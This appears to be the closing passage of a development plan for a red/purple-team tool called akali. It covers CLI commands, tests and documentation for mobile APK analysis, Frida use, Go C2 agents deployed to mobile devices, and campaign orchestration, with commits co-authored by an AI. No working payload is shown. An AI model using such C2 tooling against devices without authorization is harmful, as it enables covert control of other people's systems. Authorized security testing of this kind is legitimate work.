campaign_create_parser.add_argument("--target", required=True, help="Target")
campaign_create_parser.add_argument("--mode", choices=["red", "purple"], default="purple")

campaign_run_parser = campaign_subparsers.add_parser("run", help="Run campaign")
campaign_run_parser.add_argument("campaign_id", help="Campaign ID")
```

### Step 7.5: Test CLI commands

```bash
# Test mobile static
akali mobile static tests/fixtures/test.apk

# Test C2
akali c2 agent list

# Test campaign
akali redteam campaign create test --target com.example.app --mode purple
akali redteam campaign run <campaign-id>
```

### Step 7.6: Commit

```bash
git add core/cli.py akali
git commit -m "feat(cli): add mobile, c2, and redteam commands

CLI commands:
- akali mobile static <apk>
- akali c2 agent list
- akali c2 task send <agent-id> <command>
- akali redteam campaign create/run

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

## Documentation

### Step 8.1: Write usage guide

Create `docs/MOBILE_USAGE.md` with examples:
- How to analyze APK
- How to use Frida
- How to deploy C2 agents
- How to run campaigns

### Step 8.2: Write C2 agent deployment guide

Create `docs/C2_DEPLOYMENT.md`:
- Building agents for different platforms
- Deploying to mobile devices
- ZimMemory setup

### Step 8.3: Update main README

Add Phase 7 features to README.md

### Step 8.4: Commit docs

```bash
git add docs/
git commit -m "docs: add Phase 7 usage guides

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

## Testing & Validation

### Step 9.1: Integration test with real APK

Test with DVIA (Damn Vulnerable iOS App) or InsecureBankv2

### Step 9.2: Test C2 agent on mobile device

Deploy agent to test Android/iOS device

### Step 9.3: Run full campaign

Execute purple team campaign end-to-end

### Step 9.4: Document results

---

## Phase 7 Complete! 🎉

**Deliverables:**
- ✅ Mobile static analysis (APK + IPA)
- ✅ Frida integration for dynamic testing
- ✅ Go C2 agents with ZimMemory coordination
- ✅ Campaign orchestration (red team + purple team modes)
- ✅ CLI commands
- ✅ Documentation

**Next Steps:**
- Phase 8: Wireless + IoT (separate plan)
- Phase 9: Exploit Framework + Extended Targets (separate plan)

---

**Estimated LOC:** ~5,000 lines
**Estimated Time:** 6-8 weeks (single developer)
**Test Coverage Target:** >80%
